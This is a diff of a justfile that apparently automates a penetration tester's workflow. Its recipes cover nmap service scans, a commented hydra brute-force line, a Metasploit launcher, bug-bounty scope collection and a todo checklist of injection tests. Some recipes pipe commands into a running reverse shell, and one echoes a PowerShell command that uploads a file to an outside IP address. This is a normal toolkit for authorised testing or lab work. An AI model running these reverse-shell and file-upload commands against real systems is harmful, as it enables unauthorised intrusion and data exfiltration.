@@ -13,6 +13,9 @@ setup:
 	go install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest
 	pdtm -ia
 
+cert_csr_file file:
+	openssl req -in {{file}} -text
+
 local_search:
 	grep -ir username
 	grep -ir user
@@ -29,15 +32,25 @@ ftp:
 	nmap -sC -sV -p 21 $(hack ip) -o nmap.ftp.txt
 	nmap --script ftp-* -p 21 $(hack ip) -o nmap.ftp.brute.txt
 	openssl s_client -connect $(hack ip):$(hack port) -starttls ftp # Get certificate
-#	hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f > $ip
-	echo "Check_upload_potential	15" | anew todo.txt
+	#	hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f > $ip
+	echo "check_upload_potential	15" | anew todo.txt
 	echo "common_creds_check	15" | anew todo.txt
-
-#if 'passive', just type passive on the client to disable
+	#if 'passive', just type passive on the client to disable
 
 msf:
 	msfconsole -x "set RHOSTS $(hack ip); set RPORT $(hack port);"
 
+bb_scopes:
+	#git clone https://github.com/projectdiscovery/public-bugbounty-programs
+	cd public-bugbounty-programs; git pull; cd -
+	cat public-bugbounty-programs/chaos-bugbounty-list.json  | jq ".programs[] | [.name,.url,.bounty,.domains]"  -c | while read line; do \
+		name=$(echo $line | jq .[0] | tr ' ' '_' | tr -d '"') ;\
+		url=$(echo $line | jq .[1] | tr -d '"') ;\
+		bounty=$(echo $line | jq .[2]) ;\
+		mkdir -p $bounty/$name ;\
+		echo $url > $bounty/$name/scope_url.txt ;\
+		echo $name ;\
+	done
 
 scope_level:
 	echo "domain_names	60" | anew todo.txt
@@ -112,9 +125,6 @@ log-capture pane:
 	tmux capture-pane -t 0:{{pane}} -p -S-
 
 http:
-	echo http://$(hack domain):$(hack port) | katana | anew spider_urls | anew urls.txt
-	curl -L -s http://$(hack domain):$(hack port)/robots.txt -o robots.txt
-	curl -v $(hack ip):$(hack port) 2>&1 | grep "Server:" | sed "s/< Server: //g" | anew server
 	echo "vhosts 60" | anew todo.txt
 	echo "fields 60" | anew todo.txt
 	echo "param 60" | anew todo.txt
@@ -125,13 +135,12 @@ http:
 	echo "source 60" | anew todo.txt
 	echo "tech_stack 60" | anew todo.txt
 	echo "cves 60" | anew todo.txt
+	echo http://$(hack domain):$(hack port) | katana | anew spider_urls | anew urls.txt
+	curl -L -s http://$(hack domain):$(hack port)/robots.txt -o robots.txt
+	curl -v $(hack ip):$(hack port) 2>&1 | grep "Server:" | sed "s/< Server: //g" | anew server
 
 smtp:
 	echo "username_enum" | anew todo.txt
-
-lfi:
-	echo "passwd" | anew todo.txt
-	echo "config.php" | anew todo.txt
 
 mysql:
 	nmap -p 3306 --script="+*mysql* and not brute and not dos and not fuzzer" -vv -oN mysql  $(hack ip)
@@ -169,7 +178,7 @@ srev port:
 	@hack rev {{port}}
 
 #pipe things into the current running reverse shell
-prev cmd: 
+prev cmd:
 	tmux send-keys -t reverse.0  "{{cmd}}" Enter
 	@sleep 1.0 # give it time to run
 #
@@ -212,8 +221,9 @@ field:
 	echo "format_strings	30" | anew todo.txt
 	echo "sleep		30" | anew todo.txt
 	echo "platform_specific	30" | anew todo.txt
-	echo "sqli	30" | anew todo.txt
+	echo "sqli	30" 	    | anew todo.txt
 	echo "command_injection	30" | anew todo.txt
+	echo "negative_numbers	10" | anew todo.txt
 
 #simple network management protocol check
 snmp_check:
@@ -327,3 +337,12 @@ linux_priv_esc:
 
 windows_file_post:
 	echo 'iwr -Uri http://10.10.14.12/ -Method Post -InFile w.out'
+
+api:
+	echo "find_reference_documentation 30" | anew todo.txt
+	echo "aquire_key 30" | anew todo.txt
+	echo "enumerate_fields 30" | anew todo.txt
+
+#cat the code in, like ``` cat code.c | hack code_review ```
+code_review:
+	llm -m mistral-7b-instruct-v0 -s  'Is the following code vulnerable?'
